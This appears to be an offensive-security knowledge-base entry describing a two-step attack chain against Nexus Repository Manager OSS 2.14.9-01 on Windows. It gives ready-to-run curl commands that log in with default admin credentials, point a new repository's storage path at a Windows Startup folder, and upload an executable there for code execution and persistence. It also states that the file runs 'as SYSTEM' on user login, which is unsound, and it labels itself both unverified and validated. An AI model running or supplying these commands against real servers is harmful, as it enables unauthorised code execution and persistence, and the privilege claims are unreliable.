---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - unrestricted-file-upload
  - rce
  - nexus-repository
  - maven
  - windows
  - privilege-escalation
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Repository-with-Arbitrary-Storage-Path]]'
  - '[[procedures/Upload-Malicious-Executable-via-Maven-Artifact-Manipulation]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
  - '[[Registry Run Keys - Startup Folder]]'
updated_at: '2025-12-14T17:23:28.612Z'
description: >-
  Authenticated exploitation of Nexus Repository Manager 2 vulnerability
  allowing arbitrary file writes to sensitive Windows paths, enabling RCE
  through startup folder persistence and privilege escalation to SYSTEM.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
  - '[[Registry Run Keys - Startup Folder]]'
---
# Unrestricted File Upload in Nexus Repository Manager Leading to RCE via Windows Startup Folder

Multi-stage attack chain demonstrating exploitation of an unrestricted file upload vulnerability in Nexus Repository Manager OSS 2.14.9-01, allowing authenticated admins to write arbitrary files to the Windows filesystem, culminating in remote code execution via the Startup folder and escalation to SYSTEM privileges for lateral movement.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Authenticated Admin] --> B[Repository Creation with Arbitrary Path]
    B --> C[Malicious File Upload to Startup Folder]
    C --> D[RCE on User Login and Privilege Escalation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser or curl for HTTP requests
- Binary file (e.g., calc.exe) for upload

### Target Environment

- Nexus Repository Manager OSS 2.14.9-01 running on Windows as SYSTEM
- Exposed web interface (default port 8081)
- Maven2 hosted repository support

### Initial Access Requirements

- Valid administrator credentials for Nexus
- Network access to the Nexus web interface
- No prior access beyond authentication needed

## Detailed Attack Procedures

### Step 1: Create Malicious Repository
procedure: [[procedures/Create-Malicious-Repository-with-Arbitrary-Storage-Path]]

**Objective**: Establish a hosted Maven2 repository with an unrestricted storage path pointing two levels below the target directory (e.g., Windows Startup folder) to enable arbitrary file writes.

**Instructions**: Authenticate as admin and send a POST request to the repositories endpoint with a JSON payload specifying the overrideLocalStorageUrl to a path like file:/c:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs, adjusted to position two levels below the Startup subfolder.

Use curl to execute the request:

```bash
curl -u admin:admin123 -X POST http://nexus-server:8081/nexus/service/local/repositories -H "Content-Type: application/json" -d '{"repoType":"hosted","id":"5000","name":"MyTestRepo","provider":"maven2","overrideLocalStorageUrl":"file:/c:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"}'
```

**Expected Output**: HTTP 201 Created response confirming repository creation.

**Success Indicators**:
- Repository ID 5000 is listed in Nexus admin panel
- No validation errors on the overrideLocalStorageUrl parameter

### Step 2: Upload Malicious Executable
procedure: [[procedures/Upload-Malicious-Executable-via-Maven-Artifact-Manipulation]]

**Objective**: Upload a malicious executable to the Startup folder by manipulating Maven coordinates (groupId, artifactId, version) to construct the target path, resulting in persistence and RCE on user login.

**Instructions**: Prepare a binary like calc.exe and upload it via the Maven content endpoint, setting repository ID to 5000, groupId to "Startup" (or path segment), artifactId to filename base, version to "." for extension handling, and extension to exe while packaging as jar to bypass filters.

Use curl with multipart/form-data:

```bash
curl -u admin:admin123 -X POST http://nexus-server:8081/nexus/service/local/artifact/maven/content -F r=5000 -F g=Programs -F a=Startup -F v=. -F p=jar -F c=367 -F e=exe -F file=@calc.exe
```

**Expected Output**: HTTP 201 Created or success response; verify file presence in C:\Users\myuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc.exe.

**Success Indicators**:
- File written to Startup folder
- Executable runs automatically on user login, executing as SYSTEM due to Nexus privileges

## Attack Chain Summary

### Key Achievements

1. Arbitrary directory traversal via overrideLocalStorageUrl for filesystem manipulation
2. Malicious payload placement in Windows Startup for persistence and RCE
3. Privilege escalation to SYSTEM enabling lateral movement in the network

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]
- [[Registry Run Keys - Startup Folder]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Privilege Escalation]]

---
*Last updated: 2023-10-01T12:00:00Z*
